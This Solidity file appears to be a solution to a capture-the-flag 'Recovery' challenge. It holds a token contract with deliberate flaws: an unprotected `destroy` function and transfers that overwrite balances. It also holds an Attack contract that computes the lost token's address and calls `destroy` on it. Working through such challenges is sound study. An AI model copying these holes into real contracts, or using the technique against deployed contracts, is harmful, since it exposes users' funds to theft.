// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Recovery {
    //generate tokens
    function generateToken(string memory _name, uint256 _initialSupply) public {
        new SimpleToken(_name, msg.sender, _initialSupply);
    }
}

contract SimpleToken {
    string public name;
    mapping(address => uint256) public balances;

    // constructor
    constructor(string memory _name, address _creator, uint256 _initialSupply) {
        name = _name;
        balances[_creator] = _initialSupply;
    }

    // collect ether in return for tokens
    receive() external payable {
        balances[msg.sender] = msg.value * 10;
    }

    // allow transfers of tokens
    function transfer(address _to, uint256 _amount) public {
        require(balances[msg.sender] >= _amount);
        balances[msg.sender] = balances[msg.sender] - _amount;
        balances[_to] = _amount;
    }

    // clean up after ourselves
    function destroy(address payable _to) public {
        // selfdestruct(_to);
    }
}

contract Attack {
    function computeAddress(address factory) public pure returns (address) {

        bytes memory data = abi.encodePacked(
            bytes2(0xd694),   
            factory,          
            bytes1(0x01)      
        );

        bytes32 hash = keccak256(data);

        return address(uint160(uint256(hash)));
    }
    constructor(address add) {
        address add2 = computeAddress(add);
        SimpleToken token = SimpleToken(payable(add2));
        token.destroy(payable(msg.sender));
    }
}